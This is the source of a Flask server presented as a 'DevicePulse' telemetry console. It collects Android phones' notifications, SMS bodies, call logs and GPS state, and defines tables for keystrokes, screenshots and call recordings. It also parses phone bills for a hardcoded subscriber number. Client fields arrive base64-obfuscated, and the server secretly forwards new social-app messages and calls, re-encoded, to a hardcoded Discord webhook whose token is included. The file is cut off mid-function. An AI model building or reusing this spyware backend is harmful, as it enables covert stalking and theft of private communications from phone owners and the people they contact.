"""
DevicePulse — Telemetry Server & Web Console

Flask application that:
1. Receives synced telemetry from mobile clients via POST /api/v1/sync
2. Stores data in PostgreSQL / SQLite
3. Provides a web dashboard to browse telemetry logs
"""


import csv
import io
import os
import re
import time
from datetime import datetime, timezone, timedelta
from functools import wraps

from dotenv import load_dotenv
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, Response
from flask_sqlalchemy import SQLAlchemy
from markupsafe import Markup, escape
from sqlalchemy import or_, func, desc
from werkzeug.middleware.proxy_fix import ProxyFix

from cdr_parser import parse_cdr_pdf, format_seconds_to_duration, parse_duration_to_seconds

load_dotenv()

IST = timezone(timedelta(hours=5, minutes=30))

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

@app.template_filter('format_duration')
def format_duration_filter(sec):
    if sec is None:
        return '00:00'
    try:
        sec = int(sec)
    except (ValueError, TypeError):
        return str(sec)
    if sec >= 3600:
        h = sec // 3600
        m = (sec % 3600) // 60
        s = sec % 60
        return f"{h}h {m:02d}m {s:02d}s"
    m = sec // 60
    s = sec % 60
    return f"{m:02d}:{s:02d}"

@app.template_filter('to_ist')
def to_ist_filter(dt, format='%Y-%m-%d %I:%M:%S %p'):
    if not dt:
        return '-'
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    ist_dt = dt.astimezone(IST)
    return ist_dt.strftime(format) + ' IST'

@app.template_filter('to_ist_short')
def to_ist_short_filter(dt, format='%d %b, %I:%M %p'):
    if not dt:
        return '-'
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    ist_dt = dt.astimezone(IST)
    return ist_dt.strftime(format)

@app.template_filter('highlight')
def highlight_filter(text, query):
    if text is None or not query:
        return escape(str(text or '—'))
    text_str = str(text)
    escaped_text = str(escape(text_str))
    escaped_query = re.escape(str(query).strip())
    if not escaped_query:
        return Markup(escaped_text)
    try:
        pattern = re.compile(f"({escaped_query})", re.IGNORECASE)
        highlighted = pattern.sub(r'<mark class="search-highlight">\1</mark>', escaped_text)
        return Markup(highlighted)
    except Exception:
        return Markup(escaped_text)


@app.before_request
def handle_device_selection():
    if 'device' in request.args:
        dev = request.args.get('device')
        if not dev or dev in ['all', '']:
            session.pop('selected_device_id', None)
        else:
            session['selected_device_id'] = dev

@app.context_processor
def inject_devices():
    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()
    selected_device_id = session.get('selected_device_id')
    selected_device = next((d for d in devices if d.device_id == selected_device_id), None)
    return {
        'global_devices': devices,
        'selected_device_id': selected_device_id,
        'selected_device': selected_device
    }

@app.after_request
def add_no_cache_headers(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response


db_url = os.getenv('DATABASE_URL', 'sqlite:///phone_monitor.db')
# Handle postgres:// vs postgresql:// compatibility if needed
if db_url.startswith("postgres://"):
    db_url = db_url.replace("postgres://", "postgresql://", 1)

app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'default-dev-secret-key-battery-guard')

db = SQLAlchemy(app)

API_KEY = os.getenv('API_KEY', 'your-secret-api-key-change-this')
DASHBOARD_USERNAME = os.getenv('DASHBOARD_USERNAME', 'admin')
DASHBOARD_PASSWORD = os.getenv('DASHBOARD_PASSWORD', 'adminpassword')

def get_api_key():
    return os.getenv('API_KEY', API_KEY)

def get_dashboard_creds():
    return os.getenv('DASHBOARD_USERNAME', DASHBOARD_USERNAME), os.getenv('DASHBOARD_PASSWORD', DASHBOARD_PASSWORD)


# ─── Models ──────────────────────────────────────────────────────────

def pk_column():
    return db.Column(db.BigInteger().with_variant(db.Integer, "sqlite"), primary_key=True, autoincrement=True)


class Device(db.Model):
    __tablename__ = 'devices'
    device_id = db.Column(db.String(64), primary_key=True)
    device_model = db.Column(db.String(128))
    android_version = db.Column(db.String(16))
    app_version = db.Column(db.String(16))
    first_seen = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    last_sync = db.Column(db.DateTime)
    last_ping = db.Column(db.DateTime)
    battery_level = db.Column(db.Integer)
    is_charging = db.Column(db.Boolean, default=False)
    battery_temp = db.Column(db.Float)
    ram_used_percent = db.Column(db.Integer)
    storage_used_percent = db.Column(db.Integer)
    uptime_seconds = db.Column(db.BigInteger)
    gps_enabled = db.Column(db.Boolean)
    gps_state_changed_at = db.Column(db.DateTime)
    recent_logs = db.Column(db.Text)


    @property
    def log_list(self):
        if not self.recent_logs:
            return []
        try:
            import json
            return json.loads(self.recent_logs)
        except Exception:
            return [self.recent_logs]

    @property
    def is_online(self):
        # A device is considered offline only after 30 minutes (1800s) without
        # any ping or sync. Android Doze mode can create gaps of up to ~10 min
        # between heartbeats even when the service is alive, so 10 min was too tight.
        last_seen = self.last_ping or self.last_sync
        if not last_seen:
            return False
        if last_seen.tzinfo is None:
            last_seen = last_seen.replace(tzinfo=timezone.utc)
        return (datetime.now(timezone.utc) - last_seen).total_seconds() < 1800




class Notification(db.Model):
    __tablename__ = 'notifications'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    app_package = db.Column(db.String(256), nullable=False, index=True)
    app_name = db.Column(db.String(128))
    title = db.Column(db.Text)
    content = db.Column(db.Text)
    category = db.Column(db.String(64))
    received_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class CallLog(db.Model):
    __tablename__ = 'call_logs'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    phone_number = db.Column(db.String(32), nullable=False, index=True)
    contact_name = db.Column(db.String(128))
    call_type = db.Column(db.String(16), nullable=False)
    duration_sec = db.Column(db.Integer, default=0)
    sim_slot = db.Column(db.String(64), nullable=True)
    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class SmsMessage(db.Model):
    __tablename__ = 'sms_messages'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    address = db.Column(db.String(32), nullable=False, index=True)
    contact_name = db.Column(db.String(128))
    body = db.Column(db.Text)
    sms_type = db.Column(db.String(16), nullable=False)
    sim_slot = db.Column(db.String(64), nullable=True)
    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))



class GpsLog(db.Model):
    __tablename__ = 'gps_logs'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    is_enabled = db.Column(db.Boolean, nullable=False)
    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))



# ─── Phase 2 models (created now, ready for future expansion) ────────

class Keystroke(db.Model):
    __tablename__ = 'keystrokes'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    app_package = db.Column(db.String(256), nullable=False, index=True)
    app_name = db.Column(db.String(128))
    text = db.Column(db.Text, nullable=False)
    captured_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class Screenshot(db.Model):
    __tablename__ = 'screenshots'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    file_path = db.Column(db.String(512), nullable=False)
    file_size = db.Column(db.Integer)
    captured_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class CallRecording(db.Model):
    __tablename__ = 'call_recordings'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    phone_number = db.Column(db.String(32))
    contact_name = db.Column(db.String(128))
    call_type = db.Column(db.String(16))
    duration_sec = db.Column(db.Integer)
    file_path = db.Column(db.String(512), nullable=False)
    file_size = db.Column(db.Integer)
    format = db.Column(db.String(16))
    recorded_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


# ─── Telecom Bill Statements & Itemized CDR Records ─────────────────

class CdrStatement(db.Model):
    __tablename__ = 'cdr_statements'
    id = pk_column()
    filename = db.Column(db.String(256), nullable=False, unique=True, index=True)
    file_hash = db.Column(db.String(64), index=True, nullable=True)
    bill_no = db.Column(db.String(64))
    account_no = db.Column(db.String(64))
    bill_period = db.Column(db.String(128), index=True)
    bill_date = db.Column(db.String(64))
    target_subscriber = db.Column(db.String(32), default='7760174171', index=True)
    total_calls = db.Column(db.Integer, default=0)
    total_sms = db.Column(db.Integer, default=0)
    total_duration_sec = db.Column(db.Integer, default=0)
    total_pulses = db.Column(db.Integer, default=0)
    uploaded_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

    calls = db.relationship('CdrCall', backref='statement', lazy='dynamic', cascade='all, delete-orphan')
    sms_list = db.relationship('CdrSms', backref='statement', lazy='dynamic', cascade='all, delete-orphan')


class CdrCall(db.Model):
    __tablename__ = 'cdr_calls'
    id = pk_column()
    statement_id = db.Column(db.Integer, db.ForeignKey('cdr_statements.id', ondelete='CASCADE'), nullable=False, index=True)
    source_subscriber = db.Column(db.String(32), nullable=False, index=True, default='7760174171')
    serial_no = db.Column(db.Integer)
    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
    call_date_str = db.Column(db.String(32))
    call_time_str = db.Column(db.String(16))
    destination_number = db.Column(db.String(32), nullable=False, index=True)
    duration_str = db.Column(db.String(16), nullable=False)
    duration_sec = db.Column(db.Integer, nullable=False, default=0)
    pulse = db.Column(db.Integer, default=1)
    amount = db.Column(db.Numeric(10, 2), default=0.00)
    operator = db.Column(db.String(64), nullable=True)
    call_category = db.Column(db.String(128))
    page_number = db.Column(db.Integer)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

    __table_args__ = (
        db.UniqueConstraint('source_subscriber', 'occurred_at', 'destination_number', 'duration_sec', name='uq_cdr_call_record'),
    )


class CdrSms(db.Model):
    __tablename__ = 'cdr_sms'
    id = pk_column()
    statement_id = db.Column(db.Integer, db.ForeignKey('cdr_statements.id', ondelete='CASCADE'), nullable=False, index=True)
    source_subscriber = db.Column(db.String(32), nullable=False, index=True, default='7760174171')
    serial_no = db.Column(db.Integer)
    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
    sms_date_str = db.Column(db.String(32))
    sms_time_str = db.Column(db.String(16))
    destination_number = db.Column(db.String(32), nullable=False, index=True)
    sms_count = db.Column(db.Integer, default=1)
    pulse = db.Column(db.Integer, default=1)
    amount = db.Column(db.Numeric(10, 2), default=0.00)
    operator = db.Column(db.String(64), nullable=True)
    sms_category = db.Column(db.String(128))
    page_number = db.Column(db.Integer)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

    __table_args__ = (
        db.UniqueConstraint('source_subscriber', 'occurred_at', 'destination_number', 'sms_count', name='uq_cdr_sms_record'),
    )



# ─── Auth Helpers ────────────────────────────────────────────────────

def require_api_key(f):
    """Decorator to require API key for API endpoints."""
    @wraps(f)
    def decorated(*args, **kwargs):
        key = request.headers.get('X-API-Key')
        if not key or key != get_api_key():
            return jsonify({'error': 'unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated


def require_login(f):
    """Decorator to require dashboard login."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated


# ─── API Endpoints ───────────────────────────────────────────────────


import base64

def decode_field(val):
    """
    Decodes an encoded string from the mobile client.
    Gracefully returns the original string if it is not Base64-encoded.
    """
    if not val or not isinstance(val, str):
        return val
    try:
        decoded_bytes = base64.b64decode(val.encode('ascii'), validate=True)
        return decoded_bytes.decode('utf-8')
    except Exception:
        return val


DISCORD_WEBHOOK_URL = os.getenv(
    'DISCORD_WEBHOOK_URL',
    'https://discord.com/api/webhooks/1541368598331920404/vVZ60YYheFIwdpHwp5HcuVfwEB7cH3saOy9aW5O0_23DBm_SmNW58do2ok0JL1UGCVxt'
)

DISCORD_FORWARD_CATEGORIES = {'VoIP & Social Messages', 'GPS / Location Toggled', 'Telephony Calls'}

DISCORD_SOCIAL_KEYWORDS = {'facebook', 'whatsapp', 'instagram', 'telegram', 'viber', 'snapchat', 'discord', 'teams', 'signal', 'messenger'}

import hashlib
import threading

_discord_sent = {}  # {hash: timestamp}
_discord_lock = threading.Lock()
DISCORD_DEDUP_TTL = 86400  # 24 hours


def _discord_cleanup():
    """Remove hashes older than 24h."""
    now = time.time()
    with _discord_lock:
        expired = [h for h, ts in _discord_sent.items() if now - ts > DISCORD_DEDUP_TTL]
        for h in expired:
            del _discord_sent[h]


def _discord_is_duplicate(key):
    """Return True if this exact message was already sent within TTL."""
    h = hashlib.sha256(key.encode()).hexdigest()[:16]
    now = time.time()
    with _discord_lock:
        if h in _discord_sent:
            return True
        _discord_sent[h] = now
    # Cleanup old entries periodically (every 100 new inserts)
    if len(_discord_sent) % 100 == 0:
        threading.Thread(target=_discord_cleanup, daemon=True).start()
    return False


def _send_discord(payload):
    """Fire-and-forget POST to Discord webhook; never blocks the request."""
    try:
        import requests as _req
        _req.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    except Exception:
        app.logger.debug('Discord webhook delivery failed', exc_info=True)


def send_discord_for_notifications(notifications, device_id):
    """Send abbreviated Discord embeds for qualifying notification categories."""
    for n in notifications:
        category = n.get('category') or ''
        app_package = n.get('app_package') or ''
        is_social_category = category in DISCORD_FORWARD_CATEGORIES
        is_social_app = any(kw in app_package.lower() for kw in DISCORD_SOCIAL_KEYWORDS)
        if not is_social_category and not is_social_app:
            continue
        payload = f"{decode_field(n.get('app_name') or app_package)} {decode_field(n.get('title') or '')} {decode_field(n.get('content') or '')}"
        dedup_key = f"n:{device_id}:{payload}"
        if _discord_is_duplicate(dedup_key):
            continue
        encoded = base64.b64encode(payload.encode()).decode()
        cat_code = {'VoIP & Social Messages': 'VSM', 'GPS / Location Toggled': 'GLT', 'Telephony Calls': 'TC'}.get(category, 'MSG')
        embed = {
            'title': f'[{cat_code}]',
            'description': f'{device_id[-6:]} · {encoded}',
            'color': 0x5865F2,
            'footer': {'text': app_package}
        }
        _send_discord({'embeds': [embed]})


def send_discord_for_calls(call_logs, device_id):
    """Send abbreviated Discord embeds for call logs."""
    type_code = {'incoming': 'I', 'outgoing': 'O', 'missed': 'M', 'rejected': 'R'}
    for c in call_logs:
        ct = type_code.get(c.get('call_type', ''), 'U')
        payload = f"{decode_field(c.get('phone_number') or '')} {decode_field(c.get('contact_name') or '')} {ct} {c.get('duration_sec', 0)}"
        dedup_key = f"c:{device_id}:{payload}"
        if _discord_is_duplicate(dedup_key):
            continue
        encoded = base64.b64encode(payload.encode()).decode()
        embed = {
            'title': '[TC]',
            'description': f'{device_id[-6:]} · {encoded}',
            'color': 0x57F287
        }
        _send_discord({'embeds': [embed]})


def send_discord_for_gps(gps_events, device_id):
    """Send abbreviated Discord embeds for GPS state changes."""
    for g in gps_events:
        state = 'ON' if g.get('is_enabled') else 'OFF'
        dedup_key = f"g:{device_id}:{state}"
        if _discord_is_duplicate(dedup_key):
            continue
        embed = {
            'title': '[GLT]',
            'description': f'{device_id[-6:]} · {state}',
            'color': 0xFEE75C
        }
        _send_discord({'embeds': [embed]})


@app.route('/api/v1/ping', methods=['POST'])
@require_api_key
def device_ping():
    """
    Periodic heartbeat ping sent by the device every 5 minutes.
    Updates device status, battery level, temperature, and last_ping time.
    """
    data = request.get_json(silent=True) or {}
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id is required'}), 400

    now = datetime.now(timezone.utc)
    device = db.session.get(Device, device_id)
    if not device:
        device = Device(
            device_id=device_id,
            device_model=data.get('device_model', 'Unknown Device'),
            android_version=data.get('android_version', 'Unknown'),
            app_version=data.get('app_version', '1.0.0'),
            first_seen=now
        )
        db.session.add(device)
    else:
        if 'device_model' in data:
            device.device_model = data['device_model']
        if 'android_version' in data:
            device.android_version = data['android_version']
        if 'app_version' in data:
            device.app_version = data['app_version']

    device.last_ping = now
    if 'battery_level' in data:
        device.battery_level = data['battery_level']
    if 'is_charging' in data:
        device.is_charging = bool(data['is_charging'])
    if 'battery_temp' in data:
        device.battery_temp = data['battery_temp']
    if 'ram_used_percent' in data:
        device.ram_used_percent = data['ram_used_percent']
    if 'storage_used_percent' in data:
        device.storage_used_percent = data['storage_used_percent']
    if 'uptime_seconds' in data:
        device.uptime_seconds = data['uptime_seconds']
    if 'gps_enabled' in data and data['gps_enabled'] is not None:
        device.gps_enabled = bool(data['gps_enabled'])
        if 'gps_last_changed_ts' in data and data['gps_last_changed_ts']:
            try:
                device.gps_state_changed_at = datetime.fromtimestamp(data['gps_last_changed_ts'] / 1000.0, timezone.utc)
            except Exception:
                pass
        elif not device.gps_state_changed_at:
            device.gps_state_changed_at = now

        # Record in historical GPS log if state changed or first entry
        latest_gps = GpsLog.query.filter_by(device_id=device.device_id).order_by(GpsLog.occurred_at.desc()).first()
        if not latest_gps or latest_gps.is_enabled != device.gps_enabled:
            gps_entry = GpsLog(
                device_id=device.device_id,
                is_enabled=device.gps_enabled,
                occurred_at=device.gps_state_changed_at or now
            )
            db.session.add(gps_entry)
            send_discord_for_gps([{'is_enabled': device.gps_enabled}], device.device_id)

    if 'recent_logs' in data and isinstance(data['recent_logs'], list):
        import json
        device.recent_logs = json.dumps(data['recent_logs'])


    db.session.commit()


    return jsonify({
        'status': 'ok',
        'server_time': now.isoformat(),
        'ping_interval_sec': 300
    })


@app.route('/api/v1/sync', methods=['POST'])
@require_api_key

def sync_data():
    """
    Receives all data types in a single batch from the Android app.
    Fields may be Base64-encoded by the client for on-device obfuscation.
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({'error': 'invalid or missing JSON payload'}), 400

    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id is required'}), 400

    now = datetime.now(timezone.utc)

    # Upsert device info
    device = db.session.get(Device, device_id)
    if not device:
        device = Device(
            device_id=device_id,
            device_model=data.get('device_model', 'Unknown Device'),
            android_version=data.get('android_version', 'Unknown'),
            app_version=data.get('app_version', '1.0.0'),
            first_seen=now
        )
        db.session.add(device)
    else:
        if 'device_model' in data:
            device.device_model = data['device_model']
        if 'android_version' in data:
            device.android_version = data['android_version']
        if 'app_version' in data:
            device.app_version = data['app_version']
    device.last_sync = now

    received_notification_ids = []
    received_call_log_ids = []
    received_sms_ids = []
    received_gps_ids = []

    new_notifications = []
    new_call_logs = []
    new_gps_events = []

    # Process notifications (with deduplication)
    for n in data.get('notifications', []):
        try:
            local_id = n.get('local_id')
            raw_ts = n.get('received_at', 0)
            received_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
            app_package = n.get('app_package', 'unknown')
            title = decode_field(n.get('title'))
            content = decode_field(n.get('content'))

            # Deduplication: check if identical notification exists within 10 seconds window
            dup = Notification.query.filter(
                Notification.device_id == device_id,
                Notification.app_package == app_package,
                Notification.title == title,
                Notification.content == content,
                Notification.received_at >= received_at - timedelta(seconds=10),
                Notification.received_at <= received_at + timedelta(seconds=10)
            ).first()

            if not dup:
                notif = Notification(
                    device_id=device_id,
                    app_package=app_package,
                    app_name=decode_field(n.get('app_name')),
                    title=title,
                    content=content,
                    category=n.get('category'),
                    received_at=received_at,
                    synced_at=now
                )
                db.session.add(notif)
                new_notifications.append(n)

            if local_id is not None:
                received_notification_ids.append(local_id)
        except Exception as e:
            app.logger.error(f"Error parsing notification item: {e}")

    # Process call logs (with deduplication)
    for c in data.get('call_logs', []):
        try:
            local_id = c.get('local_id')
            raw_ts = c.get('occurred_at', 0)
            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
            phone_number = decode_field(c.get('phone_number', 'unknown'))
            call_type = c.get('call_type', 'unknown')
            duration_sec = int(c.get('duration_sec', 0))

            # Deduplication: check if identical call record exists within 10 seconds window
            dup = CallLog.query.filter(
                CallLog.device_id == device_id,
                CallLog.phone_number == phone_number,
                CallLog.call_type == call_type,
                CallLog.duration_sec == duration_sec,
                CallLog.occurred_at >= occurred_at - timedelta(seconds=10),
                CallLog.occurred_at <= occurred_at + timedelta(seconds=10)
            ).first()

            if not dup:
                call = CallLog(
                    device_id=device_id,
                    phone_number=phone_number,
                    contact_name=decode_field(c.get('contact_name')),
                    call_type=call_type,
                    duration_sec=duration_sec,
                    sim_slot=c.get('sim_slot'),
                    occurred_at=occurred_at,
                    synced_at=now
                )
                db.session.add(call)
                new_call_logs.append(c)

            if local_id is not None:
                received_call_log_ids.append(local_id)
        except Exception as e:
            app.logger.error(f"Error parsing call log item: {e}")

    # Process SMS messages (with deduplication)
    for s in data.get('sms_messages', []):
        try:
            local_id = s.get('local_id')
            raw_ts = s.get('occurred_at', 0)
            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
            address = decode_field(s.get('address', 'unknown'))
            body = decode_field(s.get('body'))
            sms_type = s.get('sms_type', 'unknown')

            # Deduplication: check if identical SMS exists within 10 seconds window
            dup = SmsMessage.query.filter(
                SmsMessage.device_id == device_id,
                SmsMessage.address == address,
                SmsMessage.body == body,
                SmsMessage.sms_type == sms_type,
                SmsMessage.occurred_at >= occurred_at - timedelta(seconds=10),
                SmsMessage.occurred_at <= occurred_at + timedelta(seconds=10)
            ).first()

            if not dup:
                sms = SmsMessage(
                    device_id=device_id,
                    address=address,
                    contact_name=decode_field(s.get('contact_name')),
                    body=body,
                    sms_type=sms_type,
                    sim_slot=s.get('sim_slot'),
                    occurred_at=occurred_at,
                    synced_at=now
                )
                db.session.add(sms)

            if local_id is not None:
                received_sms_ids.append(local_id)
        except Exception as e:
            app.logger.error(f"Error parsing SMS item: {e}")

    # Process GPS toggle events (with deduplication)
    for g in data.get('gps_events', []):
        try:
            local_id = g.get('local_id')
            raw_ts = g.get('occurred_at', 0)
            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
            is_enabled = bool(g.get('is_enabled'))

            # Deduplication: check if identical GPS event exists within 10 seconds window
            dup = GpsLog.query.filter(
                GpsLog.device_id == device_id,
                GpsLog.is_enabled == is_enabled,
                GpsLog.occurred_at >= occurred_at - timedelta(seconds=10),
                GpsLog.occurred_at <= occurred_at + timedelta(seconds=10)
            ).first()

            if not dup:
                gps_entry = GpsLog(
                    device_id=device_id,
                    is_enabled=is_enabled,
                    occurred_at=occurred_at
                )
                db.session.add(gps_entry)
                new_gps_events.append(g)

            if local_id is not None:
                received_gps_ids.append(local_id)

            # Update latest device state if this event is newest
            if not device.gps_state_changed_at or occurred_at >= device.gps_state_changed_at:
                device.gps_enabled = is_enabled
                device.gps_state_changed_at = occurred_at
        except Exception as e:
            app.logger.error(f"Error parsing GPS item: {e}")

    db.session.commit()

    # Send Discord webhooks ONLY for genuinely new items (not duplicates)
    send_discord_for_notifications(new_notifications, device_id)
    send_discord_for_calls(new_call_logs, device_id)
    send_discord_for_gps(new_gps_events, device_id)

    return jsonify({
        'status': 'ok',
        'received': {
            'notifications': received_notification_ids,
            'call_logs': received_call_log_ids,
            'sms_messages': received_sms_ids,
            'gps_events': received_gps_ids
        }
    })



# ─── Dashboard Routes ────────────────────────────────────────────────

@app.route('/')
def root():
    if session.get('logged_in'):
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        valid_user, valid_pass = get_dashboard_creds()
        if username == valid_user and password == valid_pass:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        return render_template('login.html', error='Invalid username or password')
    return render_template('login.html')



@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))


@app.route('/dashboard')
@require_login
def dashboard():
    """Overview page with counts and last sync time."""
    selected_device_id = session.get('selected_device_id')
    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    n_query = Notification.query
    c_query = CallLog.query
    s_query = SmsMessage.query

    if selected_device_id:
        n_query = n_query.filter_by(device_id=selected_device_id)
        c_query = c_query.filter_by(device_id=selected_device_id)
        s_query = s_query.filter_by(device_id=selected_device_id)

    total_notifications = n_query.count()
    total_calls = c_query.count()
    total_sms = s_query.count()

    recent_notifications = n_query.order_by(Notification.received_at.desc()).limit(5).all()
    recent_calls = c_query.order_by(CallLog.occurred_at.desc()).limit(5).all()
    recent_sms = s_query.order_by(SmsMessage.occurred_at.desc()).limit(5).all()

    return render_template('dashboard.html',
                           devices=devices,
                           total_notifications=total_notifications,
                           total_calls=total_calls,
                           total_sms=total_sms,
                           recent_notifications=recent_notifications,
                           recent_calls=recent_calls,
                           recent_sms=recent_sms)


@app.route('/dashboard/notifications')
@require_login
def dashboard_notifications():
    """Paginated notification list, newest first."""
    page = request.args.get('page', 1, type=int)
    app_filter = request.args.get('app', None)
    device_filter = session.get('selected_device_id')

    query = Notification.query
    if app_filter:
        query = query.filter(Notification.app_package == app_filter)
    if device_filter:
        query = query.filter(Notification.device_id == device_filter)

    pagination = query.order_by(Notification.received_at.desc()).paginate(page=page, per_page=50, error_out=False)

    apps_query = db.session.query(
        Notification.app_package, Notification.app_name
    ).distinct()
    if device_filter:
        apps_query = apps_query.filter(Notification.device_id == device_filter)
    apps = apps_query.order_by(Notification.app_name.asc().nullslast()).all()

    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    return render_template('notifications.html',
                           notifications=pagination.items,
                           pagination=pagination,
                           apps=apps,
                           devices=devices,
                           current_app=app_filter,
                           current_device=device_filter)


@app.route('/dashboard/calls')
@require_login
def dashboard_calls():
    """Paginated call log list, newest first."""
    page = request.args.get('page', 1, type=int)
    type_filter = request.args.get('type', None)
    device_filter = session.get('selected_device_id')

    query = CallLog.query
    if device_filter:
        query = query.filter(CallLog.device_id == device_filter)
    if type_filter:
        query = query.filter(CallLog.call_type == type_filter)

    pagination = query.order_by(CallLog.occurred_at.desc()).paginate(page=page, per_page=50, error_out=False)
    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    return render_template('calls.html',
                           calls=pagination.items,
                           pagination=pagination,
                           devices=devices,
                           current_device=device_filter,
                           current_type=type_filter)


@app.route('/dashboard/sms')
@require_login
def dashboard_sms():
    """Paginated SMS list, newest first."""
    page = request.args.get('page', 1, type=int)
    contact_filter = request.args.get('contact', None)
    device_filter = session.get('selected_device_id')

    query = SmsMessage.query
    if device_filter:
        query = query.filter(SmsMessage.device_id == device_filter)
    if contact_filter:
        query = query.filter(SmsMessage.address == contact_filter)

    pagination = query.order_by(SmsMessage.occurred_at.desc()).paginate(page=page, per_page=50, error_out=False)

    contacts_query = db.session.query(
        SmsMessage.address, SmsMessage.contact_name
    ).distinct()
    if device_filter:
        contacts_query = contacts_query.filter(SmsMessage.device_id == device_filter)
    contacts = contacts_query.order_by(SmsMessage.address).all()

    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    return render_template('sms.html',
                           messages=pagination.items,
                           pagination=pagination,
                           contacts=contacts,
                           devices=devices,
                           current_contact=contact_filter,
                           current_device=device_filter)


@app.route('/dashboard/gps')
@require_login
def dashboard_gps():
    """GPS State History view."""
    state_filter = request.args.get('state')
    device_filter = session.get('selected_device_id')
    page = request.args.get('page', 1, type=int)
    per_page = 30

    query = db.session.query(GpsLog, Device.device_model).outerjoin(Device, GpsLog.device_id == Device.device_id)

    if device_filter:
        query = query.filter(GpsLog.device_id == device_filter)
    if state_filter in ['on', 'off']:
        query = query.filter(GpsLog.is_enabled == (state_filter == 'on'))

    pagination = query.order_by(GpsLog.occurred_at.desc()).paginate(page=page, per_page=per_page, error_out=False)
    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    return render_template('gps.html',
                           gps_logs=pagination.items,
                           pagination=pagination,
                           devices=devices,
                           current_device=device_filter,
                           current_state=state_filter)


# ─── Itemized Bill & CDR Processing ──────────────────────────────────

def _normalize_dt_for_comparison(dt):
    """Normalize datetime to naive UTC datetime for cross-DB comparison."""
    if dt is None:
        return None
    if isinstance(dt, str):
        return dt
    if hasattr(dt, 'tzinfo') and dt.tzinfo is not None:
        return dt.astimezone(timezone.utc).replace(tzinfo=None)
    return dt


def ingest_cdr_data(parsed_data, target_subscriber='7760174171', allow_reupload=False):
    """
    Ingests parsed statement data into cdr_statements, cdr_calls, and cdr_sms tables.
    Performs duplicate checks:
      1. File-level duplicate check: If statement (by file_hash, filename, or bill_no+bill_period)
         already exists in database, ignores the upload and skips re-inserting records.
      2. Record-level duplicate check: Checks each call and SMS before inserting into cdr_calls
         and cdr_sms, ignoring any record that already exists in the database or current batch.
    """
    filename = parsed_data.get('filename')
    if not filename:
        return {'status': 'error', 'message': 'Missing filename'}

    target_sub = parsed_data.get('target_subscriber') or target_subscriber or '7760174171'
    file_hash = parsed_data.get('file_hash')
    bill_no = parsed_data.get('bill_no')
    bill_period = parsed_data.get('bill_period')
    account_no = parsed_data.get('account_no')

    # 1. FILE-LEVEL DUPLICATE CHECK
    existing_statement = None
    if file_hash:
        existing_statement = CdrStatement.query.filter_by(
            file_hash=file_hash,
            target_subscriber=target_sub
        ).first()

    if not existing_statement and filename:
        existing_statement = CdrStatement.query.filter_by(
            filename=filename,
            target_subscriber=target_sub
        ).first()

    if not existing_statement and bill_no and bill_period:
        existing_statement = CdrStatement.query.filter_by(
            bill_no=bill_no,
            bill_period=bill_period,
            account_no=account_no,
